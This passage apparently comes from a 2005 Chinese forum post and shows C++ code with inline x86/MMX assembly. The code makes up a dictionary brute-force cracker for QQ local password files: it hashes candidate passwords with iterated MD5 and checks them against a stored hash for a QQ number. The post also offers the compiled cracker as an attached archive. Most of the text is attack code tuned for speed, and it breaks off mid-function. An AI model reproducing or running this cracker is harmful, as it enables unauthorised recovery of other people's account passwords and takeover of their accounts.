    md5\_II0 (b, c, d, a, md5\_S44, md5\_S440,0xeb86d391);  
      
    \_\_asm  
    {  
      add a,0x67452301;  
      add b,0xefcdab89;  
      add c,0x98badcfe;  
      add d,0x10325476;  
      movd mm0,a;  
      movd mm1,b;  
      movd mm2,c;  
      movd mm3,d;  
    }  
    jmp Begin;  
  }  
End:  
  //输出数据  
  \_\_asm  
  {  
    pop ebp;  
    mov \[dataIn0\],eax;  
    mov \[dataIn0+4\],ebx;  
    mov \[dataIn0+8\],ecx;  
    mov \[dataIn0+12\],edx;  
    emms;  
  }  
  \_\_asm popad;  
  
  if(memcmp(MD5Result,dataIn0,16) == 0)  return true;  
  return false;  
}  
  
附件只包括 QQ 本地密码暴力破解程序。不包括源代码。  
附件:qqdecoder.rar  

上述算法的简单汇编实现。  
  
一下代码由 http://bbs.pediy.com/showthread.php?s=&threadid=11673 这里给出的 md5 的汇编实现转化过来。  
  
然而，这个代码的运行速度和源代码经过优化后的运行速度一样。速度上没有任何改观。  
  
  
//Md5 算法  
typedef unsigned char UI8;  
typedef char I8;  
typedef unsigned long UI32;  
  
#define S11 7  
#define S12 12  
#define S13 17  
#define S14 22  
#define S21 5  
#define S22 9  
#define S23 14  
#define S24 20  
#define S31 4  
#define S32 11  
#define S33 16  
#define S34 23  
#define S41 6  
#define S42 10  
#define S43 15  
#define S44 21  
  
#define a esi  
#define b edi  
#define c edx  
#define d ebx  
#define tmp1 eax  
#define tmp2 ecx  
  
#define x(i) \[x+4\*i\]  
  
#define FF(a, b, c, d, x, s, ac) \\  
  \_\_asm mov tmp1,b \\  
  \_\_asm and tmp1,c \\  
  \_\_asm mov tmp2,b \\  
  \_\_asm not tmp2 \\  
  \_\_asm and tmp2,d \\  
  \_\_asm or tmp2,tmp1 \\  
  \_\_asm lea a,\[tmp2+a+ac\] \\  
  \_\_asm add a,x \\  
  \_\_asm rol a,s \\  
  \_\_asm add a,b \\  
    
#define GG(a, b, c, d, x, s, ac) \\  
  \_\_asm mov tmp1,b \\  
  \_\_asm and tmp1,d \\  
  \_\_asm mov tmp2,d \\  
  \_\_asm not tmp2 \\  
  \_\_asm and tmp2,c \\  
  \_\_asm or tmp2,tmp1 \\  
  \_\_asm lea a,\[tmp2+a+ac\] \\  
  \_\_asm add a,x \\  
  \_\_asm rol a,s \\  
  \_\_asm add a,b   
  
#define HH(a,b,c, d, x, s, ac) \\  
  \_\_asm mov tmp2,b \\  
  \_\_asm xor tmp2,c \\  
  \_\_asm xor tmp2,d \\  
  \_\_asm lea a,\[tmp2+a+ac\] \\  
  \_\_asm add a,x \\  
  \_\_asm rol a,s \\  
  \_\_asm add a,b  
  
#define II(a, b, c, d, x, s, ac) \\  
  \_\_asm mov tmp2,d \\  
  \_\_asm not tmp2 \\  
  \_\_asm or tmp2,b \\  
  \_\_asm xor tmp2,c \\  
  \_\_asm lea a,\[tmp2+a+ac\] \\  
  \_\_asm add a,x \\  
  \_\_asm rol a,s \\  
  \_\_asm add a,b  
  
///////////////////////////////////////  
// QQ 解密正式开始  
//////////////////////////////////////  
//作者：冲出宇宙  
//2005，11，1  
//////////////////////////////////////  
UI8 MD5Result\[16\];  //md5 加密后的结果  
UI32 LoopNum;    //循环次数  
UI32 QQNum;    //qq 号码  
UI32 PwdNum;    //已经对多少个字符串进行了检查  
CString Pwd;    //当前正确的密码  
CString FileQQ,FilePwd;  //密码文件和密码字典文件  
  
DWORD DecodeThreadId;    
HANDLE DecodeThreadHandle;  //解密线程  
  
CQQDecoderCtrl \*Me;  
  
//密码是否正确  
bool IsPasswordCorrect(char\* sPwd)  
{  
  UI32 x\[16\];  
  UI32 a0;  
  a0 = strlen(sPwd);  
  memset(x,0,64);  
  memcpy(x,sPwd,a0);  
  x\[14\] = a0\*8;  
  ((UI8\*)x)\[a0\] = 0x80;  
  {  
    \_\_asm pushad;  
    {  
      \_\_asm {  
        //initial  
          mov a,0x67452301  
          mov b,0xefcdab89  
          mov c,0x98badcfe  
          mov d,0x10325476  
      }  
        
      /\* Round 1 \*/  
      FF(a, b, c, d, x( 0), S11, 0xd76aa478); /\* 1 \*/  
      FF(d, a, b, c, x( 1), S12, 0xe8c7b756); /\* 2 \*/  
      FF(c, d, a, b, x( 2), S13, 0x242070db); /\* 3 \*/  
      FF(b, c, d, a, x( 3), S14, 0xc1bdceee); /\* 4 \*/  
      FF(a, b, c, d, x( 4), S11, 0xf57c0faf); /\* 5 \*/  
      FF(d, a, b, c, x( 5), S12, 0x4787c62a); /\* 6 \*/  
      FF(c, d, a, b, x( 6), S13, 0xa8304613); /\* 7 \*/  
      FF(b, c, d, a, x( 7), S14, 0xfd469501); /\* 8 \*/  
      FF(a, b, c, d, x( 8), S11, 0x698098d8); /\* 9 \*/  
      FF(d, a, b, c, x( 9), S12, 0x8b44f7af); /\* 10 \*/  
      FF(c, d, a, b, x(10), S13, 0xffff5bb1); /\* 11 \*/  
      FF(b, c, d, a, x(11), S14, 0x895cd7be); /\* 12 \*/  
      FF(a, b, c, d, x(12), S11, 0x6b901122); /\* 13 \*/  
      FF(d, a, b, c, x(13), S12, 0xfd987193); /\* 14 \*/  
      FF(c, d, a, b, x(14), S13, 0xa679438e); /\* 15 \*/  
      FF(b, c, d, a, x(15), S14, 0x49b40821); /\* 16 \*/  
        
      /\* Round 2 \*/  
      GG (a, b, c, d, x( 1), S21, 0xf61e2562); /\* 17 \*/  
      GG (d, a, b, c, x( 6), S22, 0xc040b340); /\* 18 \*/  
      GG (c, d, a, b, x(11), S23, 0x265e5a51); /\* 19 \*/  
      GG (b, c, d, a, x( 0), S24, 0xe9b6c7aa); /\* 20 \*/  
      GG (a, b, c, d, x( 5), S21, 0xd62f105d); /\* 21 \*/  
      GG (d, a, b, c, x(10), S22,  0x2441453); /\* 22 \*/  
      GG (c, d, a, b, x(15), S23, 0xd8a1e681); /\* 23 \*/  
      GG (b, c, d, a, x( 4), S24, 0xe7d3fbc8); /\* 24 \*/  
      GG (a, b, c, d, x( 9), S21, 0x21e1cde6); /\* 25 \*/  
      GG (d, a, b, c, x(14), S22, 0xc33707d6); /\* 26 \*/  
      GG (c, d, a, b, x( 3), S23, 0xf4d50d87); /\* 27 \*/  
      GG (b, c, d, a, x( 8), S24, 0x455a14ed); /\* 28 \*/  
      GG (a, b, c, d, x(13), S21, 0xa9e3e905); /\* 29 \*/  
      GG (d, a, b, c, x( 2), S22, 0xfcefa3f8); /\* 30 \*/  
      GG (c, d, a, b, x( 7), S23, 0x676f02d9); /\* 31 \*/  
      GG (b, c, d, a, x(12), S24, 0x8d2a4c8a); /\* 32 \*/  
        
      /\* Round 3 \*/  
      HH (a, b, c, d, x( 5), S31, 0xfffa3942); /\* 33 \*/  
      HH (d, a, b, c, x( 8), S32, 0x8771f681); /\* 34 \*/  
      HH (c, d, a, b, x(11), S33, 0x6d9d6122); /\* 35 \*/  
      HH (b, c, d, a, x(14), S34, 0xfde5380c); /\* 36 \*/  
      HH (a, b, c, d, x( 1), S31, 0xa4beea44); /\* 37 \*/  
      HH (d, a, b, c, x( 4), S32, 0x4bdecfa9); /\* 38 \*/  
      HH (c, d, a, b, x( 7), S33, 0xf6bb4b60); /\* 39 \*/  
      HH (b, c, d, a, x(10), S34, 0xbebfbc70); /\* 40 \*/  
      HH (a, b, c, d, x(13), S31, 0x289b7ec6); /\* 41 \*/  
      HH (d, a, b, c, x( 0), S32, 0xeaa127fa); /\* 42 \*/  
      HH (c, d, a, b, x( 3), S33, 0xd4ef3085); /\* 43 \*/  
      HH (b, c, d, a, x( 6), S34,  0x4881d05); /\* 44 \*/  
      HH (a, b, c, d, x( 9), S31, 0xd9d4d039); /\* 45 \*/  
      HH (d, a, b, c, x(12), S32, 0xe6db99e5); /\* 46 \*/  
      HH (c, d, a, b, x(15), S33, 0x1fa27cf8); /\* 47 \*/  
      HH (b, c, d, a, x( 2), S34, 0xc4ac5665); /\* 48 \*/  
        
      /\* Round 4 \*/  
      II (a, b, c, d, x( 0), S41, 0xf4292244); /\* 49 \*/  
      II (d, a, b, c, x( 7), S42, 0x432aff97); /\* 50 \*/  
      II (c, d, a, b, x(14), S43, 0xab9423a7); /\* 51 \*/  
      II (b, c, d, a, x( 5), S44, 0xfc93a039); /\* 52 \*/  
      II (a, b, c, d, x(12), S41, 0x655b59c3); /\* 53 \*/  
      II (d, a, b, c, x( 3), S42, 0x8f0ccc92); /\* 54 \*/  
      II (c, d, a, b, x(10), S43, 0xffeff47d); /\* 55 \*/  
      II (b, c, d, a, x( 1), S44, 0x85845dd1); /\* 56 \*/  
      II (a, b, c, d, x( 8), S41, 0x6fa87e4f); /\* 57 \*/  
      II (d, a, b, c, x(15), S42, 0xfe2ce6e0); /\* 58 \*/  
      II (c, d, a, b, x( 6), S43, 0xa3014314); /\* 59 \*/  
      II (b, c, d, a, x(13), S44, 0x4e0811a1); /\* 60 \*/  
      II (a, b, c, d, x( 4), S41, 0xf7537e82); /\* 61 \*/  
      II (d, a, b, c, x(11), S42, 0xbd3af235); /\* 62 \*/  
      II (c, d, a, b, x( 2), S43, 0x2ad7d2bb); /\* 63 \*/  
      II (b, c, d, a, x( 9), S44, 0xeb86d391); /\* 64 \*/  
        
      \_\_asm {  
          mov \[x\],0x67452301;  
          mov \[x+4\],0xefcdab89;  
          mov \[x+8\],0x98badcfe;  
          mov \[x+12\],0x10325476;  
          add \[x\],a;  
          add \[x+4\],b;  
          add \[x+8\],c;  
          add \[x+12\],d;  
      }  
      \_\_asm popad;  
    }  
  }  
  memset(x+16,0,48);  
  x\[4\] = 0x80;  
  x\[14\] = 0x80;  
  
  //主要轮次  
  for(UI32 i=1;i<LoopNum;i++)    
  {  
    \_\_asm pushad;  
    {  
      \_\_asm {  
        //initial  
          mov a,0x67452301  
          mov b,0xefcdab89  
          mov c,0x98badcfe  
          mov d,0x10325476  
      }  
  
      /\* Round 1 \*/  
      FF(a, b, c, d, x( 0), S11, 0xd76aa478); /\* 1 \*/  
      FF(d, a, b, c, x( 1), S12, 0xe8c7b756); /\* 2 \*/  
      FF(c, d, a, b, x( 2), S13, 0x242070db); /\* 3 \*/  
      FF(b, c, d, a, x( 3), S14, 0xc1bdceee); /\* 4 \*/  
      FF(a, b, c, d, x( 4), S11, 0xf57c0faf); /\* 5 \*/  
      FF(d, a, b, c, x( 5), S12, 0x4787c62a); /\* 6 \*/  
      FF(c, d, a, b, x( 6), S13, 0xa8304613); /\* 7 \*/  
      FF(b, c, d, a, x( 7), S14, 0xfd469501); /\* 8 \*/  
      FF(a, b, c, d, x( 8), S11, 0x698098d8); /\* 9 \*/  
      FF(d, a, b, c, x( 9), S12, 0x8b44f7af); /\* 10 \*/  
      FF(c, d, a, b, x(10), S13, 0xffff5bb1); /\* 11 \*/  
      FF(b, c, d, a, x(11), S14, 0x895cd7be); /\* 12 \*/  
      FF(a, b, c, d, x(12), S11, 0x6b901122); /\* 13 \*/  
      FF(d, a, b, c, x(13), S12, 0xfd987193); /\* 14 \*/  
      FF(c, d, a, b, x(14), S13, 0xa679438e); /\* 15 \*/  
      FF(b, c, d, a, x(15), S14, 0x49b40821); /\* 16 \*/  
        
      /\* Round 2 \*/  
      GG (a, b, c, d, x( 1), S21, 0xf61e2562); /\* 17 \*/  
      GG (d, a, b, c, x( 6), S22, 0xc040b340); /\* 18 \*/  
      GG (c, d, a, b, x(11), S23, 0x265e5a51); /\* 19 \*/  
      GG (b, c, d, a, x( 0), S24, 0xe9b6c7aa); /\* 20 \*/  
      GG (a, b, c, d, x( 5), S21, 0xd62f105d); /\* 21 \*/  
      GG (d, a, b, c, x(10), S22,  0x2441453); /\* 22 \*/  
      GG (c, d, a, b, x(15), S23, 0xd8a1e681); /\* 23 \*/  
      GG (b, c, d, a, x( 4), S24, 0xe7d3fbc8); /\* 24 \*/  
      GG (a, b, c, d, x( 9), S21, 0x21e1cde6); /\* 25 \*/  
      GG (d, a, b, c, x(14), S22, 0xc33707d6); /\* 26 \*/  
      GG (c, d, a, b, x( 3), S23, 0xf4d50d87); /\* 27 \*/  
      GG (b, c, d, a, x( 8), S24, 0x455a14ed); /\* 28 \*/  
      GG (a, b, c, d, x(13), S21, 0xa9e3e905); /\* 29 \*/  
      GG (d, a, b, c, x( 2), S22, 0xfcefa3f8); /\* 30 \*/  
      GG (c, d, a, b, x( 7), S23, 0x676f02d9); /\* 31 \*/  
      GG (b, c, d, a, x(12), S24, 0x8d2a4c8a); /\* 32 \*/  
        
      /\* Round 3 \*/  
      HH (a, b, c, d, x( 5), S31, 0xfffa3942); /\* 33 \*/  
      HH (d, a, b, c, x( 8), S32, 0x8771f681); /\* 34 \*/  
      HH (c, d, a, b, x(11), S33, 0x6d9d6122); /\* 35 \*/  
      HH (b, c, d, a, x(14), S34, 0xfde5380c); /\* 36 \*/  
      HH (a, b, c, d, x( 1), S31, 0xa4beea44); /\* 37 \*/  
      HH (d, a, b, c, x( 4), S32, 0x4bdecfa9); /\* 38 \*/  
      HH (c, d, a, b, x( 7), S33, 0xf6bb4b60); /\* 39 \*/  
      HH (b, c, d, a, x(10), S34, 0xbebfbc70); /\* 40 \*/  
      HH (a, b, c, d, x(13), S31, 0x289b7ec6); /\* 41 \*/  
      HH (d, a, b, c, x( 0), S32, 0xeaa127fa); /\* 42 \*/  
      HH (c, d, a, b, x( 3), S33, 0xd4ef3085); /\* 43 \*/  
      HH (b, c, d, a, x( 6), S34,  0x4881d05); /\* 44 \*/  
      HH (a, b, c, d, x( 9), S31, 0xd9d4d039); /\* 45 \*/  
      HH (d, a, b, c, x(12), S32, 0xe6db99e5); /\* 46 \*/  
      HH (c, d, a, b, x(15), S33, 0x1fa27cf8); /\* 47 \*/  
      HH (b, c, d, a, x( 2), S34, 0xc4ac5665); /\* 48 \*/  
        
      /\* Round 4 \*/  
      II (a, b, c, d, x( 0), S41, 0xf4292244); /\* 49 \*/  
      II (d, a, b, c, x( 7), S42, 0x432aff97); /\* 50 \*/  
      II (c, d, a, b, x(14), S43, 0xab9423a7); /\* 51 \*/  
      II (b, c, d, a, x( 5), S44, 0xfc93a039); /\* 52 \*/  
      II (a, b, c, d, x(12), S41, 0x655b59c3); /\* 53 \*/  
      II (d, a, b, c, x( 3), S42, 0x8f0ccc92); /\* 54 \*/  
      II (c, d, a, b, x(10), S43, 0xffeff47d); /\* 55 \*/  
      II (b, c, d, a, x( 1), S44, 0x85845dd1); /\* 56 \*/  
      II (a, b, c, d, x( 8), S41, 0x6fa87e4f); /\* 57 \*/  
      II (d, a, b, c, x(15), S42, 0xfe2ce6e0); /\* 58 \*/  
      II (c, d, a, b, x( 6), S43, 0xa3014314); /\* 59 \*/  
      II (b, c, d, a, x(13), S44, 0x4e0811a1); /\* 60 \*/  
      II (a, b, c, d, x( 4), S41, 0xf7537e82); /\* 61 \*/  
      II (d, a, b, c, x(11), S42, 0xbd3af235); /\* 62 \*/  
      II (c, d, a, b, x( 2), S43, 0x2ad7d2bb); /\* 63 \*/  
      II (b, c, d, a, x( 9), S44, 0xeb86d391); /\* 64 \*/  
        
      \_\_asm {  
        mov \[x\],0x67452301;  
        mov \[x+4\],0xefcdab89;  
        mov \[x+8\],0x98badcfe;  
        mov \[x+12\],0x10325476;  
        add \[x\],a;  
        add \[x+4\],b;  
        add \[x+8\],c;  
        add \[x+12\],d;  
      }  
    }  
    \_\_asm popad;  
  
  }  
  if(memcmp(MD5Result,x,16) == 0)  return true;  
  return false;  
}  
  
有一点很重要的就是，vc 好像不主动优化汇编代码。  
速度上没有改观的主要原因可能是因为 x 数组的数据没有保存到寄存器中。  
考虑到 x\[5-13\]=0,以及 x\[4\]=x\[14\]=0x80，如果把 x\[0-3\]保存到 mmx 空间，我估计时间上肯定能好不少。 

工作了半天，终于写出了基于 mmx 的代码。并且使用了一些技巧。比如，  
F(x,y,z) = (x and y) or ( not(x) and z) 可以修改为：  
f(x,y,z) = ((y xor z) and x) xor z  
同时，每次比较 2 个密码。这点利用了 mmx 是 64 位的特性。不过，难以执信的是，代码速度的提速没有预计的那么明显。明天再探讨这个问题。今天困了。  
  
代码如下：  
//Md5 算法  
typedef unsigned char UI8;  
typedef char I8;  
typedef unsigned long UI32;  
//mm0,mm1,mm2,mm3 保存有 2 个 md5 变换的 a,b,c,d 值  
//a0 和 a1 都保存在这里  
#define a mm0  
//b0,b1  
#define b mm1  
//c0,c1  
#define c mm2  
//d0,d1  
#define d mm3  
  
//m0,m1,m2,m3 是第一个数据  
//m4,m5,m6,m7 是第二个数据  
#define m2 eax  
#define m6 ebx  
#define m3 ecx  
#define m7 edx  
//m0,m4 保存在 mm4  
//m1,m5 保存在 mm5  
  
//把 ac(32)复制 2 个到 mm7(64)中去  
#define Move(ac) \\  
  \_\_asm mov esi,ac \\  
  \_\_asm movd mm6,esi \\  
  \_\_asm movd mm7,esi \\  
  \_\_asm psll mm6,32 \\  
  \_\_asm por mm7,mm6  
  
//把 data(32)复制 2 个到 a0(64)中去  
#define Move0(a0,data) \\  
  \_\_asm mov esi,data \\  
  \_\_asm movd a0,esi \\  
  \_\_asm movd mm7,esi \\  
  \_\_asm psll a0,32 \\  
  \_\_asm por a0,mm7  
  
  
#define F(x,y,z) \\  
  \_\_asm movq mm6,y \\  
  \_\_asm pxor mm6,z \\  
  \_\_asm pand mm6,x \\  
  \_\_asm pxor mm6,z  
  
#define G(x,y,z) \\  
  \_\_asm movq mm6,x \\  
  \_\_asm pxor mm6,y \\  
  \_\_asm pand mm6,z \\  
  \_\_asm pxor mm6,y  
  
#define H(x,y,z) \\  
  \_\_asm movq mm6,x \\  
  \_\_asm pxor mm6,y \\  
  \_\_asm pxor mm6,z  
  
#define I(x,y,z) \\  
\_\_asm movd mm6,edi \\  
\_\_asm movd mm7,edi \\  
\_\_asm psllq mm6,32 \\  
\_\_asm pxor mm6,mm7 \\  
\_\_asm pxor mm6,z \\  
\_\_asm por mm6,x \\  
\_\_asm pxor mm6,y  
  
  
//当 x 数组数据为 0 或者 0x80 时,有 x\[4\]=0x80,x\[14\]=0x80,x\[5-13,15\]=0;  
//ac 为普通的 2 个 32 位组成  
//s0 + s1 = 32,因为没有循环左移位  
#define md5\_FF0(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
F(b0,c0,d0) \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm paddd a0,mm6 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
  
//当 x 数组数据不为 0 时  
//调用第一个数据  
#define md5\_FF1(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
F(b0,c0,d0) \\  
\_\_asm paddd a0,mm6 \\  
\_\_asm paddd mm7,mm4 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
//第二个数据  
#define md5\_FF2(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
F(b0,c0,d0) \\  
\_\_asm paddd mm7,mm5 \\  
\_\_asm paddd a0,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
//第三个数据  
#define md5\_FF3(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
F(b0,c0,d0) \\  
\_\_asm paddd mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movd mm6,eax \\  
\_\_asm movd mm7,ebx \\  
\_\_asm psll mm6,32 \\  
\_\_asm por mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
//第四个数据  
#define md5\_FF4(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
F(b0,c0,d0) \\  
\_\_asm paddd mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movd mm6,ecx \\  
\_\_asm movd mm7,edx \\  
\_\_asm psll mm6,32 \\  
\_\_asm por mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
//为 0  
#define md5\_GG0(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
G(b0,c0,d0) \\  
\_\_asm paddd a0,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
//当 x 数组数据不为 0 时  
#define md5\_GG1(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
G(b0,c0,d0) \\  
\_\_asm paddd mm7,mm4 \\  
\_\_asm paddd a0,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
#define md5\_GG2(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
G(b0,c0,d0) \\  
\_\_asm paddd mm7,mm5 \\  
\_\_asm paddd a0,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
#define md5\_GG3(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
G(b0,c0,d0) \\  
\_\_asm paddd mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movd mm6,eax \\  
\_\_asm movd mm7,ebx \\  
\_\_asm psll mm6,32 \\  
\_\_asm por mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
#define md5\_GG4(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
G(b0,c0,d0) \\  
\_\_asm paddd mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movd mm6,ecx \\  
\_\_asm movd mm7,edx \\  
\_\_asm psll mm6,32 \\  
\_\_asm por mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
  
//为 0  
#define md5\_HH0(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
H(b0,c0,d0) \\  
\_\_asm paddd a0,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
//当 x 数组数据不为 0 时  
#define md5\_HH1(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
H(b0,c0,d0) \\  
\_\_asm paddd mm7,mm4 \\  
\_\_asm paddd a0,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
#define md5\_HH2(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
H(b0,c0,d0) \\  
\_\_asm paddd mm7,mm5 \\  
\_\_asm paddd a0,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
#define md5\_HH3(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
H(b0,c0,d0) \\  
\_\_asm paddd mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movd mm6,eax \\  
\_\_asm movd mm7,ebx \\  
\_\_asm psll mm6,32 \\  
\_\_asm por mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
#define md5\_HH4(a0,b0,c0,d0,s0,s1,ac) \\  
Move(ac) \\  
H(b0,c0,d0) \\  
\_\_asm paddd mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movd mm6,ecx \\  
\_\_asm movd mm7,edx \\  
\_\_asm psll mm6,32 \\  
\_\_asm por mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
  
//为 0  
#define md5\_II0(a0,b0,c0,d0,s0,s1,ac)\\  
I(b0,c0,d0) \\  
\_\_asm paddd a0,mm6 \\  
Move(ac) \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
//当 x 数组数据不为 0 时  
#define md5\_II1(a0,b0,c0,d0,s0,s1,ac) \\  
I(b0,c0,d0) \\  
\_\_asm paddd a0,mm6 \\  
Move(ac) \\  
\_\_asm paddd mm7,mm4 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
#define md5\_II2(a0,b0,c0,d0,s0,s1,ac) \\  
I(b0,c0,d0) \\  
\_\_asm paddd a0,mm6 \\  
Move(ac) \\  
\_\_asm paddd mm7,mm5 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
#define md5\_II3(a0,b0,c0,d0,s0,s1,ac) \\  
I(b0,c0,d0) \\  
\_\_asm paddd a0,mm6 \\  
Move(ac) \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movd mm6,eax \\  
\_\_asm movd mm7,ebx \\  
\_\_asm psll mm6,32 \\  
\_\_asm por mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
#define md5\_II4(a0,b0,c0,d0,s0,s1,ac) \\  
I(b0,c0,d0) \\  
\_\_asm paddd a0,mm6 \\  
Move(ac) \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movd mm6,ecx \\  
\_\_asm movd mm7,edx \\  
\_\_asm psll mm6,32 \\  
\_\_asm por mm7,mm6 \\  
\_\_asm paddd a0,mm7 \\  
\_\_asm movq mm7,a0 \_\_asm psrld a0,s0 \_\_asm pslld mm7,s1 \_\_asm por a0,mm7 \\  
\_\_asm paddd a0,b0  
  
#define md5\_S11 25  
#define md5\_S12 20  
#define md5\_S13 15  
#define md5\_S14 10  
#define md5\_S21 27  
#define md5\_S22 23  
#define md5\_S23 18  
#define md5\_S24 12  
#define md5\_S31 28  
#define md5\_S32 21  
#define md5\_S33 16  
#define md5\_S34 9  
#define md5\_S41 26  
#define md5\_S42 22  
#define md5\_S43 17  
#define md5\_S44 11  
//以下数据和上面数据对应的和为 32  
#define md5\_S110 7  
#define md5\_S120 12  
#define md5\_S130 17  
#define md5\_S140 22  
#define md5\_S210 5  
#define md5\_S220 9  
#define md5\_S230 14  
#define md5\_S240 20  
#define md5\_S310 4  
#define md5\_S320 11  
#define md5\_S330 16  
#define md5\_S340 23  
#define md5\_S410 6  
#define md5\_S420 10  
#define md5\_S430 15  
#define md5\_S440 21  
  
  
  
///////////////////////////////////////  
// QQ 解密正式开始  
//////////////////////////////////////  
//作者：冲出宇宙  
//2005，11，2  
//////////////////////////////////////  
UI8 MD5Result\[16\];  //md5 加密后的结果  
UI32 LoopNum;    //循环次数  
UI32 QQNum;      //qq 号码  
UI32 PwdNum;    //已经对多少个字符串进行了检查  
CString Pwd;    //当前正确的密码  
CString FileQQ,FilePwd;  //密码文件和密码字典文件  
  
DWORD DecodeThreadId;    
HANDLE DecodeThreadHandle;  //解密线程  
  
CQQDecoderCtrl \*Me;  
  
//密码是否正确，每次测试 2 个密码  
int IsPasswordCorrect(char\* sPwd0,char\* sPwd1)  
{  
  UI32 i,dataIn0\[4\],dataIn1\[4\];  
  MD5 md5;  
  //第一轮  
  md5.Hash((UI8\*)dataIn0,(UI8\*)sPwd0,strlen(sPwd0));  
  md5.Hash((UI8\*)dataIn1,(UI8\*)sPwd1,strlen(sPwd1));  
  
  \_\_asm pushad;  
  //准备输入数据  
  \_\_asm  
  {  
    //1: mm4  
    mov esi,\[dataIn0\];  
    mov edi,\[dataIn1\];  
    movd mm4,esi;  
    movd mm6,edi;  
    psll mm4,32;  
    por mm4,mm6;  
    //2: mm5  
    mov esi,\[dataIn0+4\];  
    mov edi,\[dataIn1+4\];  
    movd mm5,esi;  
    movd mm6,edi;  
    psll mm5,32;  
    por mm5,mm6;  
    //3: eax:ebx  
    mov eax,\[dataIn0+8\];  
    mov ebx,\[dataIn1+8\];  
    //4: ecx:edx  
    mov ecx,\[dataIn0+12\];  
